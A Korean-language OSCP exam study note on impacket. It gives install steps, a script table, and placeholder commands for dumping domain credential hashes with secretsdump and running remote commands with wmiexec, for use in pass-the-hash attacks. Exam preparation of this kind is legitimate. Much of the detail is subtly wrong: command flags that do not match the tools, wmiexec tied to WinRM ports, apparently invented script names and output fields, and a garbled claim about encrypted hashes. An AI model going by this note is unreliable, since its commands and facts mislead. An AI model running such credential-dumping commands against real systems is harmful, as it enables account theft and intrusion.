# impacket

## 개요

`impacket`는 Python으로 작성된 SMB/WinRM/DCER 관련 도구 모음이다.
OSCP 시험에서는 SMB(445)와 WinRM(5985/5986)을 열거할 때 가장 유용하다.
AD 세트의 크리덴셜 덤프(secretsdump)를 위해 반드시 익혀 두자.
smbclient가 협상에 실패할 때 사용

## 설치

```bash
# impacket은 Kali에 기본 설치되어 있음
apt install impacket -y

# (직접 설치하는 경우) 가상환경 권장
python3 -m venv /opt/impacket
source /opt/impacket/bin/activate
pip install git+https://github.com/fortra/impacket.git
```

## 자주 사용하는 스크립트

| 스크립트                           | 용도                                                              |
| ---------------------------------- | ----------------------------------------------------------------- |
| `secretsdump.py`                   | LSASS 등 프로세스의 자격 증명(해시) 덤프. AD 크리덴셜 획득의 핵심 |
| `wmiexec.py`                       | WMI(Remoting)를 통해 명령 실행 (WinRM 세션 탈입)                  |
| `smbexec.py`                       | SMB 인증 후 명령 실행                                             |
| `GetADUsers.py` / `GetADGroups.py` | AD 사용자/그룹 열거 (enum4linux보다 개별적으로 활용 가능)         |
| `GetDomainPolicy.py`               | AD 정책(제약 조건) 확인                                           |

## secretsdump — AD 크리덴셜 획득

```bash
# 도메인 컨트롤러 또는 관리자 권한이 있는 호스트에서 실행
sudo python3 /usr/share/impacket/examples/secretsdump.py -dc <DC_IP> -user <DOMAIN>\\<USER> -password <PASS>
```

- `-dc`: 도메인 컨트롤러 IP
- `-user`: `DOMAIN\\USER` 형식
- 핵심 출력: `Ticket Encryption`, `Password Encryption`, `Credential Encryption` 등
  각 해시를 복사해 두면 크리덴셜 공격(Pass-the-Hash 등)에 사용한다.

## wmiexec — WinRM 세션 탈입

```bash
# 5985(HTTP) 또는 5986(HTTPS)로부터
sudo python3 /usr/share/impacket/examples/wmiexec.py -u <DOMAIN>\\<USER> -p <PASS> -dc <DC_IP> <TARGET_IP>
```

## 사용 시 주의

- 관리자 권한이 필요한 작업(`-dc` 접속, 프로세스 덤프)는 sudo로 실행한다.
- 도메인 계정으로 접속했을 때 로컬 계정이 아니면 로컬 권한 상승 경로가 달라진다. 먼저 현재 사용자의 그룹/특권을 확인한다(04-privilege-escalation 참고).
- 결과물 중 암호화되지 않은 해시만 사용한다. 암호화된 해시는 크리덴셜 재사용에 쓸 수 없다.
